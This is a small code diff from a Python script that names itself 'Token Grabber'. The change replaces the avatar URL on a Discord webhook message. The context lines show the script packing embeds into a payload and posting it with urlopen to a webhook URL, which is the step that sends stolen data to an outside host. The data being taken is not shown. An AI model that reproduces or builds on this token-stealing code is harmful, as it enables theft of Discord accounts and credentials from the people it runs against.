@@ -251,7 +251,7 @@ def main():
 		"content": "",
 		"embeds": embeds,
 		"username": "Token Grabber",
-		"avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
+		"avatar_url": "https://cdn.discordapp.com/avatars/843105140684357632/a_b8b9bc7a162cf1ce3db47ff687f1bff5.webp?size=80"
 	}
 	try:
 		urlopen(Request(webhook_url, data=dumps(webhook).encode(), headers=getheaders()))
